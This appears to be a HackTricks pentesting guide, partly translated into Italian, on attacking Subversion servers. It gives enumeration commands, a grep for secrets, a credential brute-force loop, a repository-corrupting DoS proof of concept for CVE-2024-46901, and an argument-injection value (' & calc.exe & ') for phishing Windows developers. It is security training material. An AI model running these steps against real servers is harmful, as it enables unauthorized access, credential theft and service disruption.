# 3690/tcp - Pentesting Subversion (SVN) Server

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base

**Subversion (SVN)** è un sistema centralizzato di **controllo delle versioni** (licenza Apache) utilizzato per la gestione delle versioni del software e per il controllo delle revisioni.

**Porta predefinita:** `3690/tcp` (svnserve). Può anche essere esposto tramite **HTTP/HTTPS** tramite `mod_dav_svn` e tramite **svn+ssh**.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Enumerazione
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Auth & Misconfig Hunting

- `svnserve.conf` may allow `anon-access = read` (or even write). If you can list, try `checkout` to dump secrets, scripts, CI tokens.
- I repository frequentemente memorizzano **pipeline di build**, **deployment keys** e **credenziali del database** in file di configurazione versionati. Grep la working copy dopo il checkout: `grep -R "password\|secret\|token" -n .`.
- Se svn+ssh è abilitato, le shell utente spesso permettono comandi `svnserve` limitati; prova `ssh user@host svnserve -t` con sottocomandi creati ad hoc per bypassare i wrapper.

### Bruteforcing credentials (svnserve)

`sasl` authentication (if enabled) and simple password files are protected only by the transport; no lockout by default. Un rapido loop Bash può provare credenziali:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Vulnerabilità recenti (impatto pratico)

### mod_dav_svn DoS tramite caratteri di controllo (CVE-2024-46901)

- Un utente con diritti di commit può scrivere un percorso contenente caratteri di controllo (es. `\x01`, `\x7f`) che **corrompe il repository**, facendo fallire successivi checkout o operazioni sui log e potenzialmente causando il crash dei worker di `mod_dav_svn`.
- Colpisce Subversion ≤ **1.14.4** quando servito tramite **HTTP(S)** (`mod_dav_svn`). Corretto in **1.14.5**.
- PoC commit con `svnmucc` (richiede credenziali di commit valide):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Dopo il commit, i client normali possono crashare o rifiutare gli aggiornamenti finché gli amministratori non rimuovono manualmente la revisione con `svnadmin dump/filter/load`.

### Windows argument injection in svn client (CVE-2024-45720)

- Su Windows, la codifica dei caratteri "best-fit" in `svn.exe` permette **command-line argument injection** quando vengono processati percorsi/URL non‑ASCII appositamente creati, potenzialmente portando all'esecuzione arbitraria di programmi.
- Colpisce Subversion ≤ **1.14.3** solo su Windows; corretto in **1.14.4**. Superficie di attacco: phishing a uno sviluppatore per fargli eseguire `svn` su un URL/percorso controllato dall'attaccante.
- Pentest angle: se controlli una condivisione di rete o uno ZIP fornito a uno sviluppatore Windows, dai come nome a un repo URL o a un percorso di working-copy byte best-fit che si decodificano in argomenti iniettati in stile `" & calc.exe & "`, poi inganna la vittima facendogli eseguire `svn status` o comandi simili su quel percorso.

## Note for Exploitation Workflow

1. **Controlla il metodo di accesso**: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), o `svn+ssh://`.
2. Prova prima la lettura anonima; poi spray common creds. Se viene usato HTTP Basic, riutilizza credenziali trovate altrove.
3. **Enumera gli hook**: gli script in `hooks/pre-commit`, `post-commit` a volte contengono credenziali in chiaro o hostnames.
4. Sfrutta `svn:externals` per recuperare percorsi aggiuntivi da altri host; elencali con `svn propget svn:externals -R .` dopo il checkout.
5. Version leaks: gli header di risposta HTTP da `mod_dav_svn` di solito mostrano la versione di Subversion & Apache; confronta con 1.14.5 per individuare target vulnerabili.
6. Se ottieni accesso al filesystem del repo, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` permettono un'analisi offline senza credenziali.

## Riferimenti

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
